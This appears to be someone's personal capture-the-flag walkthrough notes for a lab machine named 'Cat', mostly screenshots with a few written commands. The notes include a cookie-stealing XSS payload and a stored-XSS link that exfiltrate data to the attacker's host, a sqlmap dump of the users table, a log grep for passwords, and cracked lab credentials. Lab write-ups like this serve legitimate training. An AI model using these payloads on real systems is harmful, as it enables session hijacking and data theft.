![](assets/Cat/Screenshot_from_2025-02-01_19-07-44.png)
  
![](assets/Cat/Screenshot_from_2025-02-01_19-15-41.png)
- apache 2.4.41
  
![image 93.png](assets/Cat/image%2093.png)
- no subdomains
  
.git directory that is only redirects so far
  
![image 1 60.png](assets/Cat/image%201%2060.png)
- file upload :3
  
  
![](assets/Cat/Screenshot_from_2025-02-01_20-00-47.png)
- no sql injection
  
dump the git :3
![image 2 60.png](assets/Cat/image%202%2060.png)
![image 3 53.png](assets/Cat/image%203%2053.png)
  
all 3 winners are using different image types
![image 4 49.png](assets/Cat/image%204%2049.png)
  
![image 5 48.png](assets/Cat/image%205%2048.png)
![image 6 44.png](assets/Cat/image%206%2044.png)
mbqr24ie1q6i58voce4olkisu5
- got this session id from a burp request
  
![image 7 43.png](assets/Cat/image%207%2043.png)
- using md5
  
![image 8 40.png](assets/Cat/image%208%2040.png)
view_cat.php calls cats.owner_username
- sign up with an xss payload
    
    - <script>new Image().src="[http://10.10.14.2:4444/cookie.php?cookie=](http://10.10.14.2:4444/cookie.php?cookie=)"+document.cookie</script>
    
- then upload a cat image to get the admin cookie
![image 9 40.png](assets/Cat/image%209%2040.png)
![image 10 35.png](assets/Cat/image%2010%2035.png)
- then go into inspect element and change the cookie manually and refresh
![image 11 33.png](assets/Cat/image%2011%2033.png)
  
![image 12 26.png](assets/Cat/image%2012%2026.png)
- URL could be useful
  
running sqlite
![image 13 26.png](assets/Cat/image%2013%2026.png)
![image 14 24.png](assets/Cat/image%2014%2024.png)
- injection opportunity on accept_cat.php
  
sqlmap -r accept_cat.txt --level=5 --risk=3 --dbms=SQLite --dump -T "users" --threads=4
![image 15 22.png](assets/Cat/image%2015%2022.png)
![image 16 20.png](assets/Cat/image%2016%2020.png)
  
  
rosa:soyunaprincesarosa
![image 17 17.png](assets/Cat/image%2017%2017.png)
were in :3
  
passwd file: /etc/pam.d/passwd  
passwd file: /etc/passwd  
passwd file: /usr/share/bash-completion/completions/passwd  
passwd file: /usr/share/lintian/overrides/passwd
  
[https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions)
  
![image 18 16.png](assets/Cat/image%2018%2016.png)
- she’s part of the adm group, we can read logs
  
- find . -exec cat {} + | grep -irE '(password|pwd|pass)[[:space:]]_=[[:space:]]_[[:alpha:]]+' *
![image 19 15.png](assets/Cat/image%2019%2015.png)
axel:aNdZwgC4tI9gnVXv_e3Q
![image 20 12.png](assets/Cat/image%2020%2012.png)
  
![image 21 12.png](assets/Cat/image%2021%2012.png)
  
- port 3000 is open with a url of
    
    - [http://localhost:3000/administrator/Employee-management/](http://localhost:3000/administrator/Employee-management/)
    
![image 22 11.png](assets/Cat/image%2022%2011.png)
  
[https://sploitus.com/exploit?id=PACKETSTORM:180457](https://sploitus.com/exploit?id=PACKETSTORM:180457)
- follow these steps to get Stored XSS PoC
![image 23 10.png](assets/Cat/image%2023%2010.png)
  
```Python
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.14.2:8888/?response=' + encodeURIComponent(data))).catch(error => console.error('Error:', error));">XSStest </a>
```
- make a repo and put this payload into there, once the repo is made make one file in the repo and send the URL to jobert@localhost using the following command
    
    - sendmail axel@localhost jobert@localhost < message.txt
    
    - this should give you the base64 encoded index.php, which has hardcoded creds
    
![image 24 9.png](assets/Cat/image%2024%209.png)